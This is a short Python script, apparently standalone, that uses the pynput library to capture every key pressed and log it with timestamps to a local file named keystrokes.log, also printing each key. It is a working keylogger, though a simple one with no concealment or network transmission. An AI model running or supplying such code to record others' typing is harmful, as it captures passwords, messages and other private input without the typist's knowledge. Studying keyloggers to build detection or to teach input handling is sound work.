from pynput.keyboard import Listener
import logging

logging.basicConfig(filename="keystrokes.log", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
        print(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")
        print(f"Special key pressed: {key}")

with Listener(on_press=on_press) as listener:
    listener.join()
